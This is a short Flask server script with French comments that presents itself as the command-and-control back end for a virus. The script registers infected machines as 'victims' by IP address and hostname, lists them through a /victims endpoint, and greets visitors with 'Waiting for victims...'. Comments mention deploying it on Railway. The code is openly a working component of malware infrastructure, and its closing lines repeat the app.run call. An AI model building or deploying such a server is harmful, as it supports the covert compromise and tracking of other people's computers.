from flask import Flask, request, jsonify
from flask_cors import CORS
from datetime import datetime
import time

app = Flask(__name__)
CORS(app)  # Autorise tout le monde à se connecter (pour le test)

# Stockage en mémoire (s'efface si le serveur redémarre)
victims = {}

@app.route('/')
def home():
    return "F-Society Server Online. Waiting for victims..."

@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    
    # On récupère les infos envoyées par le virus
    ip = data.get('ip', 'Unknown IP')
    hostname = data.get('hostname', 'Unknown PC')
    
    # On crée un ID unique basé sur l'IP + nom (pour éviter les doublons)
    victim_id = f"{ip}_{hostname}"
    
    # On met à jour ou on crée la fiche de la victime
    victims[victim_id] = {
        'id': victim_id,
        'ip': ip,
        'hostname': hostname,
        'last_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'status': 'online'
    }
    
    print(f"[+] New Victim Connected: {hostname} ({ip})")
    return {'status': 'ok', 'message': 'Registered successfully'}

@app.route('/victims', methods=['GET'])
def get_victims():
    # On renvoie la liste des victimes
    # On vérifie aussi qui est "offline" (pas de nouvelles depuis 60s)
    now = datetime.now()
    active_victims = []
    
    for vid, info in victims.items():
        # Pour cet exemple simple, on considère que tout le monde est online
        # car on ne fait pas de vérification de heartbeat complexe ici
        active_victims.append(info)
        
    return jsonify(active_victims)

if __name__ == '__main__':
    # Ce code ne sert que si on lance en local, Railway use gunicorn
    app.run(host='0.0.0.0', port=5000)
    # Pour le test local, mais Railway utilisera gunicorn via le Procfile
    app.run(host='0.0.0.0', port=5000)
